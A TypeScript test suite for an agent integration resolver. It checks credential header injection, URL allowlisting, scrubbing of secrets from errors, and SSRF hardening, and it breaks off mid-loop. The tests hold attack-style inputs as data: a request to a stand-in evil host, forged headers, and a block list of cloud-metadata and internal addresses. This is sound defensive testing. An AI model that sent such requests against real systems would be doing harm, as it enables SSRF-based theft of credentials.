// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Appstrate

import { describe, it, expect } from "bun:test";
import { mkdtemp, realpath, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { Tool } from "@afps-spec/types";
import {
  LocalIntegrationResolver,
  RemoteAppstrateIntegrationResolver,
  readIntegrationRefs,
  readApiCallIntegrationMetas,
  STREAMING_THRESHOLD,
  type Bundle,
  type BundlePackage,
  type RunEvent,
  type ToolContext,
} from "../../src/resolvers/index.ts";
import type { ResolverError } from "../../src/errors.ts";
// Package-internal, deliberately not on the `resolvers` barrel.
import { apiCallToolName } from "../../src/resolvers/integration-api-call.ts";
import {
  BUNDLE_FORMAT_VERSION,
  bundleIntegrity,
  computeRecordEntries,
  recordIntegrity,
  serializeRecord,
  type PackageIdentity,
} from "../../src/bundle/index.ts";

const enc = new TextEncoder();

function makePackage(
  name: `@${string}/${string}`,
  version: string,
  type: "agent" | "integration",
  files: Record<string, string>,
  extraManifest: Record<string, unknown> = {},
): BundlePackage {
  const identity = `${name}@${version}` as PackageIdentity;
  const manifest = { name, version, type, ...extraManifest };
  const filesMap = new Map<string, Uint8Array>();
  filesMap.set("manifest.json", enc.encode(JSON.stringify(manifest)));
  for (const [k, v] of Object.entries(files)) filesMap.set(k, enc.encode(v));
  const integrity = recordIntegrity(serializeRecord(computeRecordEntries(filesMap)));
  return { identity, manifest, files: filesMap, integrity };
}

function makeBundle(root: BundlePackage, deps: BundlePackage[] = []): Bundle {
  const packages = new Map<PackageIdentity, BundlePackage>();
  packages.set(root.identity, root);
  for (const d of deps) packages.set(d.identity, d);
  const pkgIndex = new Map<PackageIdentity, { path: string; integrity: string }>();
  for (const p of packages.values()) {
    pkgIndex.set(p.identity, {
      path: `packages/${(p.manifest as { name: string }).name}/${(p.manifest as { version: string }).version}/`,
      integrity: p.integrity,
    });
  }
  return {
    bundleFormatVersion: BUNDLE_FORMAT_VERSION,
    root: root.identity,
    packages,
    integrity: bundleIntegrity(pkgIndex),
  };
}

function makeCtx(): { ctx: ToolContext; events: RunEvent[] } {
  const events: RunEvent[] = [];
  return {
    events,
    ctx: {
      emit: (e) => {
        events.push(e);
      },
      workspace: "/tmp",
      runId: "run_test",
      toolCallId: "call_1",
      signal: new AbortController().signal,
    },
  };
}

/** apiCall integration manifest helper (api_key auth with delivery.http). */
function apiKeyIntegrationManifest(
  _name: `@${string}/${string}`,
  opts: {
    authorizedUris?: string[];
    allowAllUris?: boolean;
    headerName?: string;
    headerPrefix?: string;
    allowServerOverride?: boolean;
  } = {},
) {
  return {
    integration: {
      schema_version: "0.1",
      type: "integration",
      source: { kind: "none" },
      _meta: { "dev.appstrate/api": { auths: { main: {} } } },
      auths: {
        main: {
          type: "api_key",
          authorized_uris: opts.authorizedUris ?? ["https://api.acme.com/**"],
          ...(opts.allowAllUris ? { allow_all_uris: true } : {}),
          credentials: { schema: {} },
          delivery: {
            http: {
              in: "header",
              name: opts.headerName ?? "X-Api-Key",
              ...(opts.headerPrefix !== undefined ? { prefix: opts.headerPrefix } : {}),
              value: "{$credential.api_key}",
              ...(opts.allowServerOverride ? { allow_server_override: true } : {}),
            },
          },
        },
      },
    },
  };
}

describe("readIntegrationRefs", () => {
  it("reads dependencies.integrations as { name, version }[]", () => {
    const root = makePackage(
      "@acme/agent",
      "1.0.0",
      "agent",
      {},
      {
        dependencies: { integrations: { "@acme/api": "^1.0.0", "@x/y": "2.0.0" } },
      },
    );
    const bundle = makeBundle(root);
    const refs = readIntegrationRefs(bundle);
    expect(refs).toEqual([
      { name: "@acme/api", version: "^1.0.0" },
      { name: "@x/y", version: "2.0.0" },
    ]);
  });

  it("returns [] when no integrations declared", () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    expect(readIntegrationRefs(makeBundle(root))).toEqual([]);
  });

  it("reads AFPS §4.1 semver-string integration deps", () => {
    const root = makePackage(
      "@acme/agent",
      "1.0.0",
      "agent",
      {},
      {
        dependencies: {
          integrations: {
            "@acme/api": "^1.0.0",
            "@acme/other": "^2.0.0",
          },
        },
        integrations_configuration: {
          "@acme/other": { scopes: ["s1"], auth_key: "oauth" },
        },
      },
    );
    const refs = readIntegrationRefs(makeBundle(root));
    expect(refs).toEqual([
      { name: "@acme/api", version: "^1.0.0" },
      { name: "@acme/other", version: "^2.0.0" },
    ]);
  });

  it("skips integration deps with non-string and missing `version`", () => {
    const root = makePackage(
      "@acme/agent",
      "1.0.0",
      "agent",
      {},
      {
        dependencies: {
          integrations: {
            "@acme/ok": "^1.0.0",
            "@acme/bad-no-version": { scopes: ["s"] },
            "@acme/bad-typed": 42,
          } as unknown as Record<string, unknown>,
        },
      },
    );
    const refs = readIntegrationRefs(makeBundle(root));
    expect(refs).toEqual([{ name: "@acme/ok", version: "^1.0.0" }]);
  });
});

describe("readApiCallIntegrationMetas", () => {
  it("projects authKey, authType, authorizedUris, delivery.http from the manifest", () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const metas = readApiCallIntegrationMetas(bundle, { name: "@acme/api", version: "^1" });
    expect(metas).toHaveLength(1);
    const meta = metas[0]!;
    expect(meta.authKey).toBe("main");
    expect(meta.authType).toBe("api_key");
    expect(meta.authorizedUris).toEqual(["https://api.acme.com/**"]);
    expect(meta.allowAllUris).toBe(false);
    expect(meta.http?.headerName).toBe("X-Api-Key");
    expect(apiCallToolName(meta)).toBe("acme_api__api_call");
  });

  it("returns [] for an integration with no apiCall (pure MCP server)", () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/mcp", "1.0.0", "integration", {
      "integration.json": JSON.stringify({
        schema_version: "0.1",
        type: "integration",
        source: { kind: "local", server: { name: "@acme/mcp-server", version: "^1.0.0" } },
        auths: {
          main: {
            type: "oauth2",
            authorized_uris: ["https://x/**"],
            delivery: {
              http: {
                in: "header",
                name: "Authorization",
                prefix: "Bearer ",
                value: "{$credential.access_token}",
              },
            },
          },
        },
      }),
    });
    const bundle = makeBundle(root, [integ]);
    expect(readApiCallIntegrationMetas(bundle, { name: "@acme/mcp", version: "^1" })).toEqual([]);
  });

  it("resolves the auth named by the api_call _meta block", () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify({
        schema_version: "0.1",
        type: "integration",
        source: { kind: "none" },
        _meta: { "dev.appstrate/api": { auths: { only: {} } } },
        auths: {
          only: {
            type: "api_key",
            authorized_uris: ["https://api.acme.com/**"],
            delivery: {
              http: { in: "header", name: "X-Api-Key", value: "{$credential.api_key}" },
            },
          },
        },
      }),
    });
    const bundle = makeBundle(root, [integ]);
    const metas = readApiCallIntegrationMetas(bundle, { name: "@acme/api", version: "^1" });
    expect(metas[0]!.authKey).toBe("only");
  });

  it("emits one meta per opted-in auth with api_call__{authToken} tool names (multi-auth)", () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/multi", "1.0.0", "integration", {
      "integration.json": JSON.stringify({
        schema_version: "0.1",
        type: "integration",
        source: { kind: "none" },
        _meta: { "dev.appstrate/api": { auths: { main: {}, alt: {} } } },
        auths: {
          main: {
            type: "api_key",
            authorized_uris: ["https://api.acme.com/**"],
            delivery: {
              http: { in: "header", name: "X-Api-Key", value: "{$credential.api_key}" },
            },
          },
          alt: {
            type: "api_key",
            authorized_uris: ["https://alt.acme.com/**"],
            delivery: {
              http: { in: "header", name: "X-Alt-Key", value: "{$credential.api_key}" },
            },
          },
        },
      }),
    });
    const bundle = makeBundle(root, [integ]);
    const metas = readApiCallIntegrationMetas(bundle, { name: "@acme/multi", version: "^1" });
    expect(metas).toHaveLength(2);
    expect(metas.map((m) => m.toolName).sort()).toEqual(["api_call__alt", "api_call__main"]);
    expect(metas.map((m) => apiCallToolName(m)).sort()).toEqual([
      "acme_multi__api_call__alt",
      "acme_multi__api_call__main",
    ]);
  });

  it("matches platform naming for long auth keys and long package namespaces", () => {
    const packageName = "@scope-with-long-name/integration-with-long-name";
    const longAuthKey = "authentication_key_that_is_valid_but_long";
    const auth = (host: string) => ({
      type: "api_key",
      authorized_uris: [`https://${host}/**`],
      delivery: {
        http: { in: "header", name: "X-Api-Key", value: "{$credential.api_key}" },
      },
    });
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage(packageName, "1.0.0", "integration", {
      "integration.json": JSON.stringify({
        schema_version: "0.1",
        type: "integration",
        source: { kind: "none" },
        _meta: {
          "dev.appstrate/api": { auths: { short: {}, [longAuthKey]: {} } },
        },
        auths: {
          short: auth("short.example.com"),
          [longAuthKey]: auth("long.example.com"),
        },
      }),
    });
    const bundle = makeBundle(root, [integ]);
    const meta = readApiCallIntegrationMetas(bundle, { name: packageName, version: "^1" }).find(
      (entry) => entry.authKey === longAuthKey,
    )!;

    expect(meta.namespace).toBe("scope_with_long_name");
    expect(meta.toolName).toBe("api_call__h0a0593260c3968fd8");
    expect(apiCallToolName(meta).length).toBeLessThanOrEqual(56);
  });

  // ── delivery.http projection ──
  // The `delivery.http.value` template reaches `HttpDeliveryConfig.valueFrom`
  // verbatim, in the one `{$credential.<field>}` grammar the resolver renders.

  it("carries a single {$credential.field} as a template", () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const meta = readApiCallIntegrationMetas(bundle, { name: "@acme/api", version: "^1" })[0]!;
    expect(meta.http?.valueFrom).toEqual({ template: "{$credential.api_key}" });
  });

  it("keeps encoding=base64 as a { template, encoding } valueFrom", () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/b64", "1.0.0", "integration", {
      "integration.json": JSON.stringify({
        schema_version: "0.1",
        type: "integration",
        source: { kind: "none" },
        _meta: { "dev.appstrate/api": { auths: { main: {} } } },
        auths: {
          main: {
            type: "api_key",
            authorized_uris: ["https://api.acme.com/**"],
            delivery: {
              http: {
                in: "header",
                name: "Authorization",
                value: "{$credential.api_key}",
                encoding: "base64",
              },
            },
          },
        },
      }),
    });
    const bundle = makeBundle(root, [integ]);
    const meta = readApiCallIntegrationMetas(bundle, { name: "@acme/b64", version: "^1" })[0]!;
    expect(meta.http?.valueFrom).toEqual({ template: "{$credential.api_key}", encoding: "base64" });
  });

  it("carries a value with two {$credential.*} refs verbatim", () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/basic", "1.0.0", "integration", {
      "integration.json": JSON.stringify({
        schema_version: "0.1",
        type: "integration",
        source: { kind: "none" },
        _meta: { "dev.appstrate/api": { auths: { main: {} } } },
        auths: {
          main: {
            type: "basic",
            authorized_uris: ["https://api.acme.com/**"],
            delivery: {
              http: {
                in: "header",
                name: "Authorization",
                prefix: "Basic ",
                value: "{$credential.username}:{$credential.password}",
              },
            },
          },
        },
      }),
    });
    const bundle = makeBundle(root, [integ]);
    const meta = readApiCallIntegrationMetas(bundle, { name: "@acme/basic", version: "^1" })[0]!;
    expect(meta.http?.valueFrom).toEqual({
      template: "{$credential.username}:{$credential.password}",
    });
  });
});

describe("LocalIntegrationResolver", () => {
  it("allocates colliding projected namespaces with the same suffix contract as McpHost", async () => {
    const first = "@scope-with-long-name/integration-one" as const;
    const second = "@scope-with-long-name/integration-two" as const;
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const packages = [first, second].map((name) =>
      makePackage(name, "1.0.0", "integration", {
        "integration.json": JSON.stringify(apiKeyIntegrationManifest(name).integration),
      }),
    );
    const bundle = makeBundle(root, packages);
    const resolver = new LocalIntegrationResolver({
      creds: {
        version: 1,
        integrations: {
          [first]: { fields: { api_key: "first" } },
          [second]: { fields: { api_key: "second" } },
        },
      },
    });

    const tools = await resolver.resolve(
      [
        { name: first, version: "^1" },
        { name: second, version: "^1" },
      ],
      bundle,
    );
    expect(tools.map((tool) => tool.name)).toEqual([
      "scope_with_long_name__api_call",
      "scope_with_long_name_2__api_call",
    ]);
  });

  it("injects the api_key header via the manifest delivery.http plan", async () => {
    const calls: { url: string; init: RequestInit }[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
      fetch: ((url: string, init: RequestInit) => {
        calls.push({ url, init });
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    expect(tools).toHaveLength(1);
    expect(tools[0]!.name).toBe("acme_api__api_call");
    const { ctx } = makeCtx();
    await tools[0]!.execute({ method: "GET", target: "https://api.acme.com/v1/me" }, ctx);
    const h = Object.fromEntries(new Headers(calls[0]!.init.headers));
    expect(h["x-api-key"]).toBe("secret");
  });

  it("raises RESOLVER_HEADER_INVALID, unsent, on an agent header that is no HTTP field value", async () => {
    let calls = 0;
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
      fetch: (() => {
        calls += 1;
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as unknown as typeof fetch,
    });
    const [tool] = await resolver.resolve(
      [{ name: "@acme/api", version: "^1" }],
      makeBundle(makePackage("@acme/agent", "1.0.0", "agent", {}), [integ]),
    );
    const { ctx } = makeCtx();
    const call = tool!.execute(
      { method: "GET", target: "https://api.acme.com/v1/me", headers: { "X-Custom": "a\u0001b" } },
      ctx,
    );
    await expect(call).rejects.toMatchObject({ code: "RESOLVER_HEADER_INVALID" });
    expect(calls).toBe(0);
  });

  it("bounds the upstream call by the shared deadline combined with the tool signal", async () => {
    let sent: AbortSignal | undefined;
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
      fetch: ((_url: string, init: RequestInit) => {
        sent = init.signal ?? undefined;
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as typeof fetch,
    });
    const tools = await resolver.resolve(
      [{ name: "@acme/api", version: "^1" }],
      makeBundle(makePackage("@acme/agent", "1.0.0", "agent", {}), [integ]),
    );
    const toolAbort = new AbortController();
    const { ctx } = makeCtx();
    await tools[0]!.execute(
      { method: "GET", target: "https://api.acme.com/v1/me" },
      { ...ctx, signal: toolAbort.signal },
    );
    expect(sent).not.toBe(toolAbort.signal);
    toolAbort.abort();
    expect(sent!.aborted).toBe(true);
  });

  it("injects oauth2 Bearer by default and substitutes {{var}} in the URL", async () => {
    const calls: { url: string; init: RequestInit }[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/oauth", "1.0.0", "integration", {
      "integration.json": JSON.stringify({
        schema_version: "0.1",
        type: "integration",
        source: { kind: "none" },
        _meta: { "dev.appstrate/api": { auths: { main: {} } } },
        auths: {
          main: {
            type: "oauth2",
            authorization_endpoint: "https://x/auth",
            token_endpoint: "https://x/token",
            authorized_uris: ["https://{{subdomain}}.acme.com/**", "https://eu.acme.com/**"],
            delivery: {
              http: {
                in: "header",
                name: "Authorization",
                prefix: "Bearer ",
                value: "{$credential.access_token}",
              },
            },
          },
        },
      }),
    });
    const bundle = makeBundle(root, [integ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: {
        version: 1,
        integrations: {
          "@acme/oauth": { fields: { access_token: "tok", subdomain: "eu" } },
        },
      },
      fetch: ((url: string, init: RequestInit) => {
        calls.push({ url, init });
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/oauth", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    await tools[0]!.execute({ method: "GET", target: "https://{{subdomain}}.acme.com/me" }, ctx);
    expect(calls[0]!.url).toBe("https://eu.acme.com/me");
    const h = Object.fromEntries(new Headers(calls[0]!.init.headers));
    expect(h["authorization"]).toBe("Bearer tok");
  });

  it("enforces authorizedUris from the manifest (no allowAllUris)", async () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "secret" } } } },
      fetch: (() =>
        Promise.resolve(new Response("{}", { status: 200 }))) as unknown as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    await expect(
      tools[0]!.execute({ method: "GET", target: "https://evil.example.com/x" }, ctx),
    ).rejects.toThrow(/not in authorized_uris/);
  });

  it("scrubs a templated secret from the host of an unresolvable-target refusal", async () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(
        apiKeyIntegrationManifest("@acme/api", { authorizedUris: ["https://*.api-us1.com/**"] })
          .integration,
      ),
    });
    const bundle = makeBundle(root, [integ]);
    const secret = "SeCrEtKey42";
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => [],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: secret } } } },
      fetch: (() =>
        Promise.resolve(new Response("{}", { status: 200 }))) as unknown as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    const err = await tools[0]!
      .execute({ method: "GET", target: "https://{{api_key}}.api-us1.com/" }, ctx)
      .then(
        () => null,
        (e: unknown) => e as Error,
      );
    expect(err?.message).toContain("could not be resolved");
    expect(err!.message).not.toContain(secret);
    expect(err!.message).not.toContain(secret.toLowerCase());
    expect((err as ResolverError).details?.target).toBe("https://{{api_key}}.api-us1.com/");
  });

  it("does not scrub a guessed credential value from the host of an untemplated call", async () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(
        apiKeyIntegrationManifest("@acme/api", { authorizedUris: ["https://*.api-us1.com/**"] })
          .integration,
      ),
    });
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => [],
      creds: {
        version: 1,
        integrations: { "@acme/api": { fields: { api_key: "k", username: "jdoe" } } },
      },
      fetch: (() =>
        Promise.resolve(new Response("{}", { status: 200 }))) as unknown as typeof fetch,
    });
    const tools = await resolver.resolve(
      [{ name: "@acme/api", version: "^1" }],
      makeBundle(root, [integ]),
    );
    const { ctx } = makeCtx();
    // A matching guess must read exactly like a non-matching one.
    for (const guess of ["jdoe", "alice"]) {
      const err = await tools[0]!
        .execute({ method: "GET", target: `https://${guess}.api-us1.com/` }, ctx)
        .then(
          () => null,
          (e: unknown) => e as Error,
        );
      expect(err?.message).toContain(`(${guess}.api-us1.com)`);
    }
  });

  it("scrubs the substituted secret from a transport error and its event", async () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const secret = "SeCrEt loop/42";
    const encoded = encodeURIComponent(secret);
    for (const fetchImpl of [
      // Redirect loop on an allowlisted host: the budget error names the start URL.
      (u: string) => Promise.resolve(new Response(null, { status: 302, headers: { location: u } })),
      // Bun-shaped fetch error: full URL in the message and on `.path`.
      (u: string) =>
        Promise.reject(
          Object.assign(new Error(`Unable to connect. Is the computer able to access ${u}?`), {
            code: "ConnectionRefused",
            path: u,
          }),
        ),
    ]) {
      const resolver = new LocalIntegrationResolver({
        resolveHost: async () => ["203.0.113.7"],
        creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: secret } } } },
        fetch: fetchImpl as unknown as typeof fetch,
      });
      const tools = await resolver.resolve(
        [{ name: "@acme/api", version: "^1" }],
        makeBundle(root, [integ]),
      );
      const { ctx, events } = makeCtx();
      const err = await tools[0]!
        .execute({ method: "GET", target: "https://api.acme.com/v1?key={{api_key}}" }, ctx)
        .then(
          () => null,
          (e: unknown) => e as Error,
        );
      expect(err?.message).toContain("api.acme.com");
      const seen = JSON.stringify({ message: err!.message, err, events });
      for (const leaked of [secret, encoded, "SeCrEt", "loop%2F42"]) {
        expect(seen).not.toContain(leaked);
      }
    }
  });

  it("strips a caller-supplied header of the same name (allowServerOverride default false)", async () => {
    const calls: { url: string; init: RequestInit }[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "real" } } } },
      fetch: ((url: string, init: RequestInit) => {
        calls.push({ url, init });
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    await tools[0]!.execute(
      {
        method: "GET",
        target: "https://api.acme.com/v1/me",
        headers: { "x-api-key": "forged", authorization: "Bearer unrelated" },
      },
      ctx,
    );
    const h = Object.fromEntries(new Headers(calls[0]!.init.headers));
    // Only the injected value survives.
    const apiKeyHeaders = Object.entries(h).filter(([k]) => k.toLowerCase() === "x-api-key");
    expect(apiKeyHeaders).toHaveLength(1);
    expect(apiKeyHeaders[0]![1]).toBe("real");
    expect(Object.keys(h).some((key) => key.toLowerCase() === "authorization")).toBe(false);
  });

  it("preserves a case-insensitive caller header only when allowServerOverride is true", async () => {
    const calls: { url: string; init: RequestInit }[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(
        apiKeyIntegrationManifest("@acme/api", {
          headerName: "Authorization",
          headerPrefix: "Bearer ",
          allowServerOverride: true,
        }).integration,
      ),
    });
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: "server" } } } },
      fetch: ((url: string, init: RequestInit) => {
        calls.push({ url, init });
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as typeof fetch,
    });
    const tools = await resolver.resolve(
      [{ name: "@acme/api", version: "^1" }],
      makeBundle(root, [integ]),
    );
    const { ctx } = makeCtx();
    await tools[0]!.execute(
      {
        method: "GET",
        target: "https://api.acme.com/v1/me",
        headers: { authorization: "Bearer caller" },
      },
      ctx,
    );
    expect(Object.fromEntries(new Headers(calls[0]!.init.headers))).toEqual({
      authorization: "Bearer caller",
    });
  });

  it("honours an explicit injection override from the creds file", async () => {
    const calls: { url: string; init: RequestInit }[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: {
        version: 1,
        integrations: {
          "@acme/api": {
            fields: { api_key: "secret" },
            injection: { headerName: "Authorization", headerPrefix: "Token " },
          },
        },
      },
      fetch: ((url: string, init: RequestInit) => {
        calls.push({ url, init });
        return Promise.resolve(new Response("{}", { status: 200 }));
      }) as typeof fetch,
    });
    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
    const { ctx } = makeCtx();
    await tools[0]!.execute({ method: "GET", target: "https://api.acme.com/v1/me" }, ctx);
    const h = Object.fromEntries(new Headers(calls[0]!.init.headers));
    expect(h["authorization"]).toBe("Token secret");
  });

  // The creds file is hand-authored and never passes through a manifest
  // validator, so the install-time bare-auth-scheme gate cannot see it. These
  // pin the load-time twin (`assertUsableCredsFile`).
  it("refuses a bare auth-scheme headerPrefix in the creds file, naming the fix", () => {
    expect(
      () =>
        new LocalIntegrationResolver({
          creds: {
            version: 1,
            integrations: {
              "@acme/api": {
                fields: { api_key: "secret" },
                injection: { headerName: "Authorization", headerPrefix: "Bearer" },
              },
            },
          },
        }),
    ).toThrow(/headerPrefix "Bearer" is a bare auth scheme.*Write "Bearer "\./s);
  });

  it("refuses it when headerName is omitted too — the override defaults to Authorization", () => {
    expect(
      () =>
        new LocalIntegrationResolver({
          creds: {
            version: 1,
            integrations: {
              "@acme/api": { fields: { api_key: "secret" }, injection: { headerPrefix: "Basic" } },
            },
          },
        }),
    ).toThrow(/Write "Basic "\./);
  });

  it("refuses it when the creds file is read from disk — the `appstrate run --creds-file` path", async () => {
    const dir = await mkdtemp(join(tmpdir(), "afps-creds-"));
    try {
      const file = join(dir, "creds.json");
      await writeFile(
        file,
        JSON.stringify({
          version: 1,
          integrations: {
            "@acme/api": {
              fields: { api_key: "secret" },
              injection: { headerName: "Authorization", headerPrefix: "Bearer" },
            },
          },
        }),
      );
      const root = makePackage("@acme/agent", "1.0.0", "agent", {});
      const integ = makePackage("@acme/api", "1.0.0", "integration", {
        "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
      });
      const bundle = makeBundle(root, [integ]);
      const resolver = new LocalIntegrationResolver({ creds: file });
      await expect(
        resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle),
      ).rejects.toThrow(/Write "Bearer "\./);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  it("injects a separator-carrying prefix, and leaves a bare one outside auth position alone", async () => {
    const calls: { url: string; init: RequestInit }[] = [];
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const fetchImpl = ((url: string, init: RequestInit) => {
      calls.push({ url, init });
      return Promise.resolve(new Response("{}", { status: 200 }));
    }) as typeof fetch;
    const injections = [
      { headerName: "Authorization", headerPrefix: "Bearer " },
      // Outside a credentials position the same bare token is an ordinary
      // literal, so the gate must not reach it.
      { headerName: "Cookie", headerPrefix: "session" },
    ];
    for (const injection of injections) {
      const resolver = new LocalIntegrationResolver({
        resolveHost: async () => ["203.0.113.7"],
        creds: {
          version: 1,
          integrations: { "@acme/api": { fields: { api_key: "secret" }, injection } },
        },
        fetch: fetchImpl,
      });
      const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
      const { ctx } = makeCtx();
      await tools[0]!.execute({ method: "GET", target: "https://api.acme.com/v1/me" }, ctx);
    }
    expect(new Headers(calls[0]!.init.headers).get("Authorization")).toBe("Bearer secret");
    expect(new Headers(calls[1]!.init.headers).get("Cookie")).toBe("sessionsecret");
  });

  it("skips integrations without apiCall and fails on missing creds", async () => {
    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
    const integ = makePackage("@acme/api", "1.0.0", "integration", {
      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
    });
    const bundle = makeBundle(root, [integ]);
    const resolver = new LocalIntegrationResolver({
      resolveHost: async () => ["203.0.113.7"],
      creds: { version: 1, integrations: {} },
    });
    await expect(resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle)).rejects.toThrow(
      /no credentials found/,
    );
  });
});

// The local resolver now routes upstream calls through the shared
// outbound-HTTP engine (`api-call-engine.ts`), gaining the SSRF blocklist
// + manual redirect-follower the platform sidecar already had. Previously
// it did a raw `fetch(target, …)` with default `redirect: "follow"` and NO
// SSRF check — these tests pin the closed gap.
describe("LocalIntegrationResolver — SSRF + redirect hardening (newly added on the CLI path)", () => {
  /** allow_all_uris is open only to an auth the proxy injects no credential for. */
  function allowAllManifest(name: `@${string}/${string}`, headerName = "") {
    return makePackage(name, "1.0.0", "integration", {
      "integration.json": JSON.stringify(
        apiKeyIntegrationManifest(name, { allowAllUris: true, headerName }).integration,
      ),
    });
  }

  function narrowAllowlistManifest(name: `@${string}/${string}`, authorizedUris: string[]) {
    return makePackage(name, "1.0.0", "integration", {
      "integration.json": JSON.stringify(
        apiKeyIntegrationManifest(name, { authorizedUris }).integration,
      ),
    });
  }

  // Even with allow_all_uris (the tool-layer authorized_uris gate is a
  // no-op), the engine's SSRF preflight must refuse internal targets.
  const blockedTargets = [
    "http://169.254.169.254/latest/meta-data/", // AWS/GCP metadata
    "http://127.0.0.1:8080/admin", // loopback
    "http://localhost/secret",
    "http://10.0.0.5/internal", // RFC1918
    "http://[::1]/x", // IPv6 loopback
    "http://metadata.google.internal/computeMetadata/v1/", // GCP metadata host
  ];
  for (const target of blockedTargets) {
